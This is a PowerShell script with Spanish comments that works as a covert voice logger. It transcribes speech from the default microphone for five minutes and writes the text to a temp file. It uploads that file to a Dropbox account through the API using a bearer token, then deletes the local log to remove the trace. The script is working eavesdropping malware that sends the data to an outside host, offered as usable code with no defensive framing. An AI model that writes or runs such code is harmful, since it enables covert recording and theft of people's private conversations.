function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$RutaArchivoOrigen
    )
    $archivoSalida = Split-Path $RutaArchivoOrigen -leaf
    $RutaArchivoDestino = "/$archivoSalida"
    $arg = '{ "path": "' + $RutaArchivoDestino + '", "mode": "add", "autorename": true, "mute": false }'
    $autorizacion = "Bearer " + $db
    $cabeceras = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $cabeceras.Add("Authorization", $autorizacion)
    $cabeceras.Add("Dropbox-API-Arg", $arg)
    $cabeceras.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $RutaArchivoOrigen -Headers $cabeceras
}

function voiceLogger {
    param (
        [int]$duracionMinutos = 5
    )

    Add-Type -AssemblyName System.Speech
    $reconocedor = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $gramatica = New-Object System.Speech.Recognition.DictationGrammar
    $reconocedor.LoadGrammar($gramatica)
    $reconocedor.SetInputToDefaultAudioDevice()

    $log = "$env:TMP\VoiceLog.txt"
    $horaInicio = Get-Date

    while ((Get-Date) -lt $horaInicio.AddMinutes($duracionMinutos)) {
        $resultado = $reconocedor.Recognize()
        if ($resultado) {
            $resultados = $resultado.Text
            Write-Output $resultados
            Add-Content $log -Value $resultados
        }
    }

    # Subir el archivo a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -RutaArchivoOrigen $log
    }

    # Borrar el archivo de registro
    Remove-Item $log -Force
}

# Llamar a la función voiceLogger con la duración en minutos deseada
voiceLogger -duracionMinutos 5
